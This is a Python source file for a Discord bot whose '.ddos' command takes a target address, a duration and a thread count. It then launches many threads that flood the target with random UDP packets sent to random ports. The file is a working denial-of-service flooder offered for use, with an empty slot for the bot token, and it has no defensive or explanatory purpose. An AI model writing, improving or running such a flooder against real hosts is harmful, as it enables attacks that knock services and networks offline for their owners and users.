import asyncio
import discord
from discord.ext import commands
import random
import socket

import threading
import time





bot = commands.Bot(command_prefix=".")

#insert your token.
token = ""

async def attack(timeout, target):
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15), (target, dport))
        return
    except Exception:
        pass

            
@bot.event
async def on_ready():
    print(f"Connected to {bot.user.name}")

@bot.command(name="ddos")
async def ddos(ctx,target:str,seconds:int,thread:int="80"):
    timeout = time.time() + 1*seconds
    for x in range(0, thread):
        threading.Thread(target=asyncio.run, args=(attack(timeout, target),)).start()
    time.sleep(seconds)
    await ctx.reply("Done")





    
bot.run(token)
